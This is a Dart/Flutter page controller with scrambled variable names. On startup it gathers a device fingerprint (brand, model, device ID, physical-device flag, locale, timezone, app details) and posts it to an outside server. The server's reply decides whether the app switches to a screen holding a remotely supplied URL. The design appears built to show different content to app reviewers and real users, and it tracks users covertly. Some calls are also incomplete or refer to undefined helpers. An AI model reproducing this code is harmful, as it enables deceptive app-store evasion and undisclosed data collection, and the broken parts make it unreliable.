import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class PageLogic extends GetxController {

  var uawxfybi = RxBool(false);
  var vxyjet = RxBool(true);
  var hlfqi = RxString("");
  var elyssa = RxBool(false);
  var rowe = RxBool(true);
  final azjyxingk = Dio();


  InAppWebViewController? webViewController;

  dynamic yspazldmku(){
    final xhzdqp = InternetConnectionChecker.instance;
    final xwqlmfetpy = xhzdqp.onStatusChange.skip(1).listen(
          (InternetConnectionStatus vfskapqcg) {
        if (vfskapqcg == InternetConnectionStatus.connected) {
          qeld();
        } else {
          Get.toNamed()?.then((_){
            qeld();
          });
        }
      },
    );
    return xwqlmfetpy;
  }

  Future<bool> bhenvzup() async {
    var ctgfmy = await NetworkUtils.isNetworkAvailable();
    if(!ctgfmy){
      Get.toNamed()?.then((_){
        qeld();
      });
    }
    return ctgfmy;
  }

  @override
  void onInit() {
    super.onInit();
    yspazldmku();
    qeld();
  }


  Future<void> qeld() async {

    var vijdyqfcs = await bhenvzup();
    if(!vijdyqfcs){
      return;
    }

    elyssa.value = true;
    rowe.value = true;
    vxyjet.value = false;

    azjyxingk.post("https://sea.fbluee.com/ehcmbuwzgtpfxjiad",data: await wfzyejnkm()).then((value) {
      var oahp = value.data["oahp"] as String;
      var wxgdemy = value.data["wxgdemy"] as bool;
      if (wxgdemy) {
        hlfqi.value = oahp;
        aleen();
      } else {
        stiedemann();
      }
    }).catchError((e) {
      vxyjet.value = true;
      rowe.value = true;
      elyssa.value = false;
    });
  }

  Future<Map<String, dynamic>> wfzyejnkm() async {
    final DeviceInfoPlugin gpscfw = DeviceInfoPlugin();
    PackageInfo plke_astcjuxq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var bhgljwmt = Platform.localeName;
    var jrxmlo = currentTimeZone;

    var pmexld = plke_astcjuxq.packageName;
    var efmhzsb = plke_astcjuxq.version;
    var ygzr = plke_astcjuxq.buildNumber;

    var qgej = plke_astcjuxq.appName;
    var khxu = "";
    var xzpivl  = "";
    var stxziylk = "";
    var juliusRaynor = "";
    var waltonVeum = "";
    var armandSchuster = "";
    var morrisRuecker = "";
    var kayleeTillman = "";
    var berthaSchultz = "";
    var velmaRaynor = "";


    var lxyh = "";
    var dekjy = false;

    if (GetPlatform.isAndroid) {
      lxyh = "android";
      var nemhjd = await gpscfw.androidInfo;

      stxziylk = nemhjd.brand;

      khxu  = nemhjd.model;
      xzpivl = nemhjd.id;

      dekjy = nemhjd.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lxyh = "ios";
      var rqneiwfxm = await gpscfw.iosInfo;
      stxziylk = rqneiwfxm.name;
      khxu = rqneiwfxm.model;

      xzpivl = rqneiwfxm.identifierForVendor ?? "";
      dekjy  = rqneiwfxm.isPhysicalDevice;
    }

    var res = {
      "qgej": qgej,
      "ygzr": ygzr,
      "efmhzsb": efmhzsb,
      "pmexld": pmexld,
      "khxu": khxu,
      "jrxmlo": jrxmlo,
      "stxziylk": stxziylk,
      "xzpivl": xzpivl,
      "bhgljwmt": bhgljwmt,
      "lxyh": lxyh,
      "dekjy": dekjy,
      "juliusRaynor" : juliusRaynor,
      "waltonVeum" : waltonVeum,
      "armandSchuster" : armandSchuster,
      "morrisRuecker" : morrisRuecker,
      "kayleeTillman" : kayleeTillman,
      "berthaSchultz" : berthaSchultz,
      "velmaRaynor" : velmaRaynor,

    };
    return res;
  }

  Future<void> stiedemann() async {
    Get.offAllNamed("/stiedemann");
  }

  Future<void> aleen() async {
    Get.offAllNamed("/aleen");
  }

  @override
  void dispose() {
    yspazldmku().cancel();
    super.dispose();
  }

}
